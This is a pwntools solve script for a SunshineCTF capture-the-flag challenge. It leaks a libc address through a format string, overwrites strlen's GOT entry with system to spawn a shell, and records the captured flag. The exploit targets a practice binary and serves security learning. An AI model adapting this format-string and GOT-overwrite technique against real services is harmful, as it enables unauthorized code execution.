#!/usr/bin/env python3
from pwn import *

PORT = 26002
HOST = "chal.sunshinectf.games"
elf = context.binary = ELF('./revolution_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x0000000000401138
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def data(dt): sla(b'score> ', dt)

# GDB()
data(b'%73$p|')
libc.address = int(p.recvuntil(b'|', drop = True), 16) - 0x2a1ca
log.info(f'libc: {hex(libc.address)}') 

strlen = elf.got.strlen
system = libc.sym.system

pl = flat(b'%7$wAAAA', strlen, system)
data(pl)
pl = flat(b'%7$sAAAA', next(libc.search(b'/bin/sh\0')))
data(pl)

p.interactive()

# sun{cust0m_fmtstr_n0_t00ls_4ll0wed}